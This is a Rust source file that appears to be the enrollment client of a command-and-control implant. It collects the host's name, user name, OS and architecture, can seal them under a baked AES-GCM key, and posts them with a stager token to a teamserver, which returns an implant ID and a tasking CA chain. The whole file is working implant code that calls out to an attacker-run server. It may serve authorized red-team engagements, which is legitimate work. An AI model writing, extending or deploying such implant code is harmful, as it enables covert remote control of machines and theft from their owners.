use base64::Engine;
use p256::ecdsa::{SigningKey, VerifyingKey};
use p256::pkcs8::EncodePublicKey;
use rand::rngs::OsRng;
use serde::Serialize;

use crate::envelope;
use crate::profile::Profile;
use crate::transport;
use crate::trust::{self, Certificate};

// The enroll client: the JSON body contract the web route carries
// (camelCase keys, base64 certificate material), with the bake's envelope
// shaping applied exactly as the .NET C2 client applies it. The implant
// owns its private key throughout; only the public half crosses the wire.

#[derive(Serialize)]
#[serde(rename_all = "camelCase")]
struct EnrollBody<'a> {
    stager_token_secret: &'a str,
    public_key: String,
    hostname: String,
    os: &'a str,
    arch: &'a str,
    username: String,
    sleep_seconds: f64,
    jitter_seconds: f64,
    #[serde(skip_serializing_if = "Option::is_none")]
    kill_date: Option<&'a str>,
}

#[derive(Default)]
pub struct Enrollment {
    pub implant_id: String,
    pub engagement_id: String,
    pub ca_chain: Vec<Certificate>,
}

pub struct KeyPair {
    pub verifying: VerifyingKey,
}

impl KeyPair {
    pub fn generate() -> KeyPair {
        let signing = SigningKey::random(&mut OsRng);
        KeyPair { verifying: *signing.verifying_key() }
    }

    /// The public half as a DER SubjectPublicKeyInfo, base64 over JSON --
    /// exactly what the teamserver reads back via ImportSubjectPublicKeyInfo.
    pub fn public_spki_base64(&self) -> String {
        let der = self
            .verifying
            .to_public_key_der()
            .expect("SPKI export")
            .as_bytes()
            .to_vec();
        base64::engine::general_purpose::STANDARD.encode(der)
    }
}

/// Enrolls against one enroll URL; Err carries the refusal cause for the
/// walk's log. Transport errors and definitive refusals are distinguished by
/// the caller's retry policy (a definitive refusal ends the run).
pub fn enroll(url: &str, profile: &Profile, keys: &KeyPair) -> Result<Enrollment, String> {
    let body = EnrollBody {
        stager_token_secret: &profile.token,
        public_key: keys.public_spki_base64(),
        hostname: hostname(),
        os: std::env::consts::OS,
        arch: std::env::consts::ARCH,
        username: username(),
        sleep_seconds: profile.sleep_seconds,
        jitter_seconds: profile.jitter_seconds,
        kill_date: profile.kill_date.as_deref(),
    };
    let json = serde_json::to_string(&body).map_err(|e| e.to_string())?;

    // The bake's envelope shaping: AES-GCM seals the JSON under the baked key
    // (the body stays opaque even where TLS terminates early), base64 wraps
    // it, raw sends the JSON document. The exact strings the teamserver's
    // enroll decode unwraps.
    let payload = match profile.envelope.as_str() {
        "aesgcm" => {
            let (key_id, key) = envelope::parse_baked_key(&profile.envelope_key)
                .ok_or("aesgcm envelope baked with no usable key")?;
            format!(
                "\"{}\"",
                String::from_utf8(envelope::seal_contact_body(
                    json.as_bytes(),
                    &key_id,
                    &key,
                    envelope::ENROLL_AAD
                ))
                .map_err(|_| "sealed body")?
            )
        }
        "base64" => format!(
            "\"{}\"",
            base64::engine::general_purpose::STANDARD.encode(json.as_bytes())
        ),
        _ => json,
    };

    let cas = trust::parse_pem(&profile.ca_pem)
        .iter()
        .filter_map(|der| trust::parse_der(der))
        .collect::<Vec<_>>();
    let agent = transport::build_agent(url, &cas, profile.request_timeout_seconds);
    let response = agent
        .post(url)
        .set("Content-Type", "application/json")
        .send_string(&payload)
        .map_err(|e| format!("enroll transport: {e}"))?;
    let status = response.status();
    let text = response
        .into_string()
        .map_err(|e| format!("enroll read: {e}"))?;
    if status != 200 && status != 401 {
        return Err(format!("enroll transport: status {status}"));
    }

    // Both the OK and the refusal bodies answer as plain JSON (the .NET
    // client reads the answer with ReadFromJsonAsync, so the envelope shapes
    // the request only -- the answer never rides sealed on the web route).
    let answer: serde_json::Value =
        serde_json::from_slice(text.as_bytes()).map_err(|_| "enroll answer was not valid JSON".to_string())?;
    let status_value = answer
        .get("status")
        .and_then(serde_json::Value::as_i64)
        .unwrap_or(0);
    if status_value != 1 {
        return Err(format!("enroll rejected: status {status_value}"));
    }

    let leaf_b64 = answer
        .get("leafCertificate")
        .and_then(serde_json::Value::as_str)
        .ok_or("enroll OK but missing leafCertificate")?;
    let _leaf = base64::engine::general_purpose::STANDARD
        .decode(leaf_b64)
        .map_err(|_| "leafCertificate")?;
    // The web poll posture authenticates at the application layer; the leaf
    // is for mTLS fronts the MVP does not dial, so it is validated (parses)
    // and dropped. The CA chain is kept: it carries the tasking signer.
    let mut ca_chain = Vec::new();
    if let Some(chain) = answer.get("caChain").and_then(serde_json::Value::as_array) {
        for entry in chain {
            let Some(text) = entry.as_str() else { continue };
            if let Ok(der) = base64::engine::general_purpose::STANDARD.decode(text) {
                if let Some(cert) = trust::parse_der(&der) {
                    ca_chain.push(cert);
                }
            }
        }
    }

    Ok(Enrollment {
        implant_id: answer
            .get("implantId")
            .and_then(serde_json::Value::as_str)
            .unwrap_or_default()
            .to_string(),
        engagement_id: answer
            .get("engagementId")
            .and_then(serde_json::Value::as_str)
            .unwrap_or_default()
            .to_string(),
        ca_chain,
    })
}

fn hostname() -> String {
    if cfg!(windows) {
        std::env::var("COMPUTERNAME").unwrap_or_else(|_| "unknown".into())
    } else {
        std::fs::read_to_string("/etc/hostname")
            .map(|h| h.trim().to_string())
            .ok()
            .filter(|h| !h.is_empty())
            .or_else(|| std::env::var("HOSTNAME").ok())
            .unwrap_or_else(|| "unknown".into())
    }
}

fn username() -> String {
    if cfg!(windows) {
        std::env::var("USERNAME").unwrap_or_default()
    } else {
        std::env::var("USER").unwrap_or_default()
    }
}
